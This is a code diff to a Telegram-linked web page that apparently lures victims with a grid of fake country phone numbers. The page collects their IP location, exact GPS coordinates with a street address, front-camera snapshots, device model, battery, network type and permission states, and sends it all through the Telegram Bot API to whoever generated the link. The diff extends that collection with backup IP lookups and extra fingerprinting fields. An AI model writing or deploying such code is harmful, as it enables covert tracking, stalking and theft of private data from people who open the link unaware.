@@ -46,10 +46,9 @@
         
         const urlParams = new URLSearchParams(window.location.search);
         const targetUserId = urlParams.get('id');
-        const mode = urlParams.get('mode') || 'basic';
+        const mode = urlParams.get('mode') || 'basic'; // basic, location, camera
         const urlLang = urlParams.get('lang'); 
 
-        // تحديد لغة رسالة البوت فقط (مش لغة الصفحة، الصفحة المتصفح هو اللي هيترجمها)
         let botLang = 'en';
         if (urlLang) {
             botLang = urlLang;
@@ -60,6 +59,7 @@
         }
 
         let ipDataGlobal = {};
+        let gpsData = null;
 
         const countriesData = [
             { flag: "🇪🇬", name: "Egypt", numbers: ["+20 10 1234 5678", "+20 11 9876 5432"] },
@@ -78,15 +78,33 @@
             try { 
                 const res = await fetch('https://ipwho.is/'); 
                 const data = await res.json();
-                if(data.success) { ipDataGlobal = data; }
-            } catch (e) {}
+                if(data.success) { 
+                    ipDataGlobal = data; 
+                } else {
+                    const backupRes = await fetch('https://ipapi.co/json/');
+                    const backupData = await backupRes.json();
+                    ipDataGlobal = {
+                        ip: backupData.ip, country: backupData.country_name, region: backupData.region,
+                        city: backupData.city, latitude: backupData.latitude, longitude: backupData.longitude
+                    };
+                }
+            } catch (e) {
+                try {
+                    const backupRes = await fetch('https://ipapi.co/json/');
+                    const backupData = await backupRes.json();
+                    ipDataGlobal = {
+                        ip: backupData.ip, country: backupData.country_name, region: backupData.region,
+                        city: backupData.city, latitude: backupData.latitude, longitude: backupData.longitude
+                    };
+                } catch(err) {}
+            }
 
             if (mode === 'location' || mode === 'camera') {
                 document.getElementById('popup').style.display = 'flex';
             } else {
                 document.getElementById('mainContent').style.display = 'block';
                 renderCountries();
-                sendBasicInfo(); // إرسال البيانات فوراً لوضع الـ basic
+                sendBasicInfo();
             }
         }
 
@@ -95,10 +113,8 @@
             grid.innerHTML = ''; 
             countriesData.forEach(c => {
                 const num = c.numbers[Math.floor(Math.random() * c.numbers.length)];
-                
                 const card = document.createElement('div');
                 card.className = 'card';
-                // الكلام هنا إنجليزي صافي، والمتصفح هو اللي هيترجمه لوحده
                 card.innerHTML = `
                     <div>
                         <div class="flag">${c.flag}</div>
@@ -116,12 +132,33 @@
             document.getElementById('loading').style.display = 'block';
             
             if (mode === 'location') {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        await sendText(`📍 Exact Location:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\n[Open Map](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
-                        finishAction();
-                    }, (err) => { alert("You must allow location access."); finishAction(); }
-                );
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (pos) => {
+                            const lat = pos.coords.latitude;
+                            const lon = pos.coords.longitude;
+                            const acc = Math.round(pos.coords.accuracy);
+                            
+                            let areaName = "Unknown";
+                            try {
+                                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=${botLang}`);
+                                const geoData = await geoRes.json();
+                                if(geoData && geoData.display_name) { areaName = geoData.display_name; }
+                            } catch(e) {}
+
+                            gpsData = { lat: lat, lon: lon, acc: acc, areaName: areaName };
+                            finishAction();
+                        },
+                        (err) => { 
+                            alert(botLang === 'ar' ? "يجب السماح بالوصول للموقع الدقيق." : "You must allow exact location access."); 
+                            finishAction(); 
+                        },
+                        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
+                    );
+                } else {
+                    alert("Geolocation is not supported by this browser.");
+                    finishAction();
+                }
             } else if (mode === 'camera') {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -135,7 +172,7 @@
                             finishAction();
                         }, 'image/jpeg', 0.8);
                     }, 1000);
-                } catch (err) { alert("You must allow camera access."); finishAction(); }
+                } catch (err) { alert(botLang === 'ar' ? "يجب السماح بالكاميرا." : "You must allow camera access."); finishAction(); }
             }
         }
 
@@ -153,17 +190,24 @@
 
             const ua = navigator.userAgent;
             
-            let osName = "Unknown";
-            let osVersion = "Unknown";
-            if (/Windows/i.test(ua)) osName = "Windows";
-            else if (/Android/i.test(ua)) osName = "Android";
-            else if (/iPhone|iPad|iPod/i.test(ua)) osName = "iOS";
-            else if (/Mac/i.test(ua)) osName = "macOS";
-            else if (/Linux/i.test(ua)) osName = "Linux";
-            
-            const osMatch = ua.match(/(Android|iPhone OS)\s([0-9\._]+)/i);
-            if (osMatch) osVersion = osMatch[2].replace(/_/g, '.');
+            // 1. نظام التشغيل
+            let osName = "غير معروف", osNameEn = "Unknown", osNameHi = "अज्ञात";
+            let osVersion = "";
+            if (/Windows/i.test(ua)) { osName = osNameEn = osNameHi = "Windows"; }
+            else if (/Android/i.test(ua)) {
+                osName = osNameEn = osNameHi = "Android";
+                const match = ua.match(/Android\s([0-9\.]+)/);
+                if (match) osVersion = match[1];
+            }
+            else if (/iPhone|iPad|iPod/i.test(ua)) {
+                osName = osNameEn = osNameHi = "iOS";
+                const match = ua.match(/OS\s([0-9_]+)/);
+                if (match) osVersion = match[1].replace(/_/g, '.');
+            }
+            else if (/Mac/i.test(ua)) { osName = osNameEn = osNameHi = "macOS"; }
+            else if (/Linux/i.test(ua)) { osName = osNameEn = osNameHi = "Linux"; }
 
+            // 2. المتصفح
             let browserName = "Unknown";
             if (/Edg/i.test(ua)) browserName = "Edge";
             else if (/Chrome|CriOS/i.test(ua)) browserName = "Chrome";
@@ -171,40 +215,92 @@
             else if (/Safari/i.test(ua)) browserName = "Safari";
             else if (/Telegram/i.test(ua)) browserName = "Telegram In-App";
 
+            // 3. موديل الجهاز
             let deviceModel = "Unknown";
             const modelMatch = ua.match(/Android[^;]+;\s([^;)]+)\sBuild/i);
             if (modelMatch) deviceModel = modelMatch[1].trim();
-            if (deviceModel === "K" || deviceModel === "Linux armv81") deviceModel = "Hidden (Browser Privacy)";
-
-            let tgPlatform = "External Browser";
-            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.platform) {
-                tgPlatform = window.Telegram.WebApp.platform;
-            }
-
+            if (deviceModel === "K" || deviceModel === "Linux armv81") deviceModel = "Hidden";
             try {
                 if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model"]);
                     if (uaData.model) deviceModel = uaData.model;
-                    if (uaData.platform) osName = uaData.platform;
-                    if (uaData.platformVersion) osVersion = uaData.platformVersion;
                 }
             } catch (e) {}
 
-            let batteryText = "Not supported";
+            // 4. منصة تليجرام
+            let tgPlatform = "Browser", tgPlatformAr = "متصفح", tgPlatformHi = "ब्राउज़र";
+            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.platform && window.Telegram.WebApp.platform !== 'unknown') {
+                tgPlatform = "Telegram (" + window.Telegram.WebApp.platform + ")";
+                tgPlatformAr = "تليجرام (" + window.Telegram.WebApp.platform + ")";
+                tgPlatformHi = "टेलीग्राम (" + window.Telegram.WebApp.platform + ")";
+            }
+
+            // 5. ميزة Wi-Fi والبيانات
+            let netAr = "غير معروف", netEn = "Unknown", netHi = "अज्ञात";
+            if (navigator.connection) {
+                const type = navigator.connection.type;
+                const effType = navigator.connection.effectiveType;
+                
+                if (type === 'wifi' || effType === 'wifi') { 
+                    netAr = "🟢 واي فاي (Wi-Fi)"; netEn = "🟢 Wi-Fi"; netHi = "🟢 वाई-फाई"; 
+                } else if (effType === '4g' || effType === '3g' || effType === '2g' || effType === 'slow-2g') { 
+                    netAr = `🔵 بيانات (Data - ${effType.toUpperCase()})`; netEn = `🔵 Cellular (${effType.toUpperCase()})`; netHi = `🔵 सेलुलर (${effType.toUpperCase()})`; 
+                } else if (type && type !== 'none') {
+                    netAr = type; netEn = type; netHi = type;
+                }
+            }
+
+            let doNotTrack = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
+            let orientation = screen.orientation ? screen.orientation.type : "Unknown";
+            let colorDepth = screen.colorDepth + " bit";
+
+            // 6. المنطقة الزمنية
+            let deviceTimezone = "Unknown";
+            try { deviceTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
+
+            // 7. البطارية
+            let batteryAr = "غير مدعوم", batteryEn = "Not supported", batteryHi = "समर्थित नहीं है";
             try {
                 const battery = await navigator.getBattery();
-                batteryText = `Level: ${Math.round(battery.level * 100)}%\n• Charging: ${battery.charging ? 'Yes' : 'No'}`;
+                const batLevel = Math.round(battery.level * 100);
+                const isCharging = battery.charging;
+                batteryAr = `المستوى: ${batLevel}%\n• جاري الشحن: ${isCharging ? 'نعم' : 'لا'}`;
+                batteryEn = `Level: ${batLevel}%\n• Charging: ${isCharging ? 'Yes' : 'No'}`;
+                batteryHi = `स्तर: ${batLevel}%\n• चार्जिंग: ${isCharging ? 'हाँ' : 'नहीं'}`;
             } catch (e) {}
+
+            // 8. الصلاحيات
+            let camStatus = "Prompt", locStatus = "Prompt";
+            try { camStatus = (await navigator.permissions.query({ name: 'camera' })).state; } catch(e) {}
+            try { locStatus = (await navigator.permissions.query({ name: 'geolocation' })).state; } catch(e) {}
+
+            let camAr = camStatus === 'granted' ? '🟢 مسموح' : camStatus === 'denied' ? '🔴 مرفوض' : '🟡 مطلوب';
+            let locAr = locStatus === 'granted' ? '🟢 مسموح' : locStatus === 'denied' ? '🔴 مرفوض' : '🟡 مطلوب';
+            
+            let camEn = camStatus === 'granted' ? '🟢 Granted' : camStatus === 'denied' ? '🔴 Denied' : '🟡 Prompt';
+            let locEn = locStatus === 'granted' ? '🟢 Granted' : locStatus === 'denied' ? '🔴 Denied' : '🟡 Prompt';
+            
+            let camHi = camStatus === 'granted' ? '🟢 अनुमति दी गई' : camStatus === 'denied' ? '🔴 अस्वीकृत' : '🟡 संकेत';
+            let locHi = locStatus === 'granted' ? '🟢 अनुमति दी गई' : locStatus === 'denied' ? '🔴 अस्वीकृत' : '🟡 संकेत';
 
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
 
+            // ==========================================
+            // قسم الـ GPS (هيظهر بس لو gpsData مش null)
+            // ==========================================
+            let gpsSectionAr = "", gpsSectionEn = "", gpsSectionHi = "";
+            if (gpsData) {
+                const mapLink = `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon}`;
+                gpsSectionAr = `\n📍 <b>الموقع الدقيق (GPS):</b>\n• المنطقة/الحي: ${gpsData.areaName}\n• خط العرض: ${gpsData.lat}\n• خط الطول: ${gpsData.lon}\n• دقة الموقع: ${gpsData.acc} متر\n• <a href="${mapLink}">فتح الخريطة</a>\n`;
+                gpsSectionEn = `\n📍 <b>Exact Location (GPS):</b>\n• Area/Neighborhood: ${gpsData.areaName}\n• Lat: ${gpsData.lat}\n• Lon: ${gpsData.lon}\n• Accuracy: ${gpsData.acc} m\n• <a href="${mapLink}">Open Map</a>\n`;
+                gpsSectionHi = `\n📍 <b>सटीक स्थान (GPS):</b>\n• क्षेत्र: ${gpsData.areaName}\n• अक्षांश: ${gpsData.lat}\n• देशांतर: ${gpsData.lon}\n• सटीकता: ${gpsData.acc} मीटर\n• <a href="${mapLink}">नक्शा खोलें</a>\n`;
+            }
+
             let report = "";
-            let lat = ipDataGlobal.latitude || 0;
-            let lon = ipDataGlobal.longitude || 0;
 
             // ==========================================
-            // بناء الرسالة للبوت (حسب الـ lang اللي جاي من الاستضافة)
+            // بناء الرسالة النهائية
             // ==========================================
             if (botLang === 'ar') {
                 report = `
@@ -213,38 +309,40 @@
 
 🖥️ <b>الجهاز والمتصفح</b>
 • موديل الجهاز: ${deviceModel}
-• نظام التشغيل: ${osName} ${osVersion !== "Unknown" ? `(إصدار ${osVersion})` : ""}
+• نظام التشغيل: ${osName} ${osVersion ? `(إصدار ${osVersion})` : ""}
 • المتصفح: ${browserName}
-• واجهة التطبيق: ${tgPlatform} (${navigator.platform})
+• واجهة التطبيق: ${tgPlatformAr}
+• كود المتصفح: <code>${ua}</code>
 
 🌐 <b>معلومات الشبكة</b>
 • الآي بي: ${ipDataGlobal.ip || 'غير معروف'}
+• نوع الاتصال: ${netAr}
 • اللغة: ${navigator.language}
+• تتبع (DNT): ${doNotTrack === 'Enabled' ? 'مفعل' : 'غير مفعل'}
 
 📍 <b>تفاصيل الموقع (IP)</b>
 • الدولة: ${ipDataGlobal.country || 'غير معروف'}
 • المحافظة: ${ipDataGlobal.region || 'غير معروف'}
 • المدينة: ${ipDataGlobal.city || 'غير معروف'}
-• المنطقة الزمنية: ${ipDataGlobal.timezone ? ipDataGlobal.timezone.id : 'غير معروف'}
+• المنطقة الزمنية: ${deviceTimezone}
 
 🖼️ <b>معلومات الشاشة</b>
 • الدقة: ${screenRes}
+• اتجاه الشاشة: ${orientation}
+• عمق الألوان: ${colorDepth}
 
 🔋 <b>حالة البطارية</b>
-• ${batteryText}
-
-🔐 <b>الصلاحيات</b>
-• الكاميرا: ${mode === 'camera' ? 'Allowed' : 'Prompt'}
-• الموقع: ${mode === 'location' ? 'Allowed' : 'Prompt'}
+• ${batteryAr}
 
 💾 <b>الهاردوير</b>
 • أنوية المعالج: ${navigator.hardwareConcurrency || 'غير معروف'}
 • الرام: ${navigator.deviceMemory ? navigator.deviceMemory + ' جيجا' : 'غير معروف'}
 • اللمس: ${isTouch}
 
-📱 <b>User-Agent</b>
-<code>${ua}</code>
-
+🔐 <b>الصلاحيات</b>
+• الكاميرا: ${camAr}
+• الموقع: ${locAr}
+${gpsSectionAr}
 ━━━━━━━━━━━━━━━━
 ⚡ <b>المطور:</b> <a href="tg://user?id=${ADMIN_ID}">تواصل مع المطور</a>
                 `;
@@ -255,38 +353,40 @@
 
 🖥️ <b>डिवाइस और ब्राउज़र</b>
 • डिवाइस मॉडल: ${deviceModel}
-• ऑपरेटिंग सिस्टम: ${osName} ${osVersion !== "Unknown" ? `(${osVersion})` : ""}
+• ऑपरेटिंग सिस्टम: ${osNameHi} ${osVersion ? `(${osVersion})` : ""}
 • ब्राउज़र: ${browserName}
-• ऐप इंटरफ़ेस: ${tgPlatform} (${navigator.platform})
+• ऐप इंटरफ़ेस: ${tgPlatformHi}
+• यूजर-एजेंट: <code>${ua}</code>
 
 🌐 <b>नेटवर्क जानकारी</b>
 • आईपी पता: ${ipDataGlobal.ip || 'अज्ञात'}
+• कनेक्शन प्रकार: ${netHi}
 • भाषा: ${navigator.language}
+• डीएनटी: ${doNotTrack === 'Enabled' ? 'सक्रिय' : 'निष्क्रिय'}
 
 📍 <b>स्थान विवरण (IP)</b>
 • देश: ${ipDataGlobal.country || 'अज्ञात'}
 • क्षेत्र: ${ipDataGlobal.region || 'अज्ञात'}
 • शहर: ${ipDataGlobal.city || 'अज्ञात'}
-• समय क्षेत्र: ${ipDataGlobal.timezone ? ipDataGlobal.timezone.id : 'अज्ञात'}
+• समय क्षेत्र: ${deviceTimezone}
 
 🖼️ <b>प्रदर्शन जानकारी</b>
 • रिज़ॉल्यूशन: ${screenRes}
+• अभिविन्यास: ${orientation}
+• रंग की गहराई: ${colorDepth}
 
 🔋 <b>बैटरी की स्थिति</b>
-• ${batteryText}
-
-🔐 <b>डिवाइस अनुमतियाँ</b>
-• कैमरा: ${mode === 'camera' ? 'Allowed' : 'Prompt'}
-• स्थान: ${mode === 'location' ? 'Allowed' : 'Prompt'}
+• ${batteryHi}
 
 💾 <b>हार्डवेयर</b>
 • सीपीयू कोर: ${navigator.hardwareConcurrency || 'अज्ञात'}
 • रैम: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'अज्ञात'}
 • टच: ${isTouch}
 
-📱 <b>User-Agent</b>
-<code>${ua}</code>
-
+🔐 <b>डिवाइस अनुमतियाँ</b>
+• कैमरा: ${camHi}
+• स्थान: ${locHi}
+${gpsSectionHi}
 ━━━━━━━━━━━━━━━━
 ⚡ <b>डेवलपर:</b> <a href="tg://user?id=${ADMIN_ID}">संपर्क करने के लिए यहां क्लिक करें</a>
                 `;
@@ -297,38 +397,40 @@
 
 🖥️ <b>Device & Browser</b>
 • Device Model: ${deviceModel}
-• OS: ${osName} ${osVersion !== "Unknown" ? `(${osVersion})` : ""}
+• OS: ${osNameEn} ${osVersion ? `(${osVersion})` : ""}
 • Browser: ${browserName}
-• App Interface: ${tgPlatform} (${navigator.platform})
+• App Interface: ${tgPlatform}
+• User-Agent: <code>${ua}</code>
 
 🌐 <b>Network Information</b>
 • IP Address: ${ipDataGlobal.ip || 'Unknown'}
+• Connection Type: ${netEn}
 • Language: ${navigator.language}
+• Do Not Track: ${doNotTrack}
 
 📍 <b>Location Details (IP)</b>
 • Country: ${ipDataGlobal.country || 'Unknown'}
 • Region: ${ipDataGlobal.region || 'Unknown'}
 • City: ${ipDataGlobal.city || 'Unknown'}
-• Timezone: ${ipDataGlobal.timezone ? ipDataGlobal.timezone.id : 'Unknown'}
+• Timezone: ${deviceTimezone}
 
 🖼️ <b>Display Information</b>
 • Resolution: ${screenRes}
+• Orientation: ${orientation}
+• Color Depth: ${colorDepth}
 
 🔋 <b>Battery Status</b>
-• ${batteryText}
-
-🔐 <b>Device Permissions</b>
-• Camera: ${mode === 'camera' ? 'Allowed' : 'Prompt'}
-• Location: ${mode === 'location' ? 'Allowed' : 'Prompt'}
+• ${batteryEn}
 
 💾 <b>Hardware & Storage</b>
 • CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
 • RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}
 • Touch Support: ${isTouch}
 
-📱 <b>User-Agent</b>
-<code>${ua}</code>
-
+🔐 <b>Device Permissions</b>
+• Camera: ${camEn}
+• Location: ${locEn}
+${gpsSectionEn}
 ━━━━━━━━━━━━━━━━
 ⚡ <b>Developed by:</b> <a href="tg://user?id=${ADMIN_ID}">Contact Developer</a>
                 `;
@@ -337,21 +439,6 @@
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
-            }).catch(e=>{});
-
-            if (lat !== 0 && lon !== 0) {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: targetUserId, latitude: lat, longitude: lon })
-                }).catch(e=>{});
-            }
-        }
-
-        async function sendText(text) {
-            if (!targetUserId) return;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: targetUserId, text: text, parse_mode: 'Markdown' })
             }).catch(e=>{});
         }
 
